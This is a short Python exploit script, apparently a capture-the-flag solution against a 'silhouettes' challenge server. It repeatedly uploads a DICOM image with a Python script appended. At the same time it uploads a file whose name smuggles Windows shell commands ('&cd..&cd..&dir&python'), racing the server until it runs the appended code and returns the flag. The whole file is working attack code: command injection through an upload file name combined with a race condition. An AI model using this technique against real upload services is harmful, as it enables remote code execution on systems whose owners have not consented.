#!/usr/bin/env python3

import multiprocessing
import requests


DICOM_IMAGE = 'dicom_jpeg.small'
READER = 'reader.py'
PW = '8nSe9ehPtuI8ZcOA'

URL = 'http://silhouettes.balsnctf.com/'
REMOTE_READER_NAME = 'one-liner-' + PW + '.py'
BAD_NAME = REMOTE_READER_NAME + '&cd..&cd..&dir&python'

image = open(DICOM_IMAGE, 'rb').read()
reader = image + open(READER, 'rb').read()


def _upload_reader():
    while True:
        files = {'file': (REMOTE_READER_NAME, reader)}
        requests.post(URL, files=files)


def _try_to_run_reader():
    files = {'file': (BAD_NAME, image)}
    r = requests.post(URL, files=files)
    r = r.content.decode('utf-8')
    print(r)
    for i in range(10):
        print()
    if 'GOT FLAG' in r:
        return False
    return True


proc = multiprocessing.Process(target=_upload_reader)
proc.start()


while _try_to_run_reader():
    pass


proc.terminate()
proc.join()
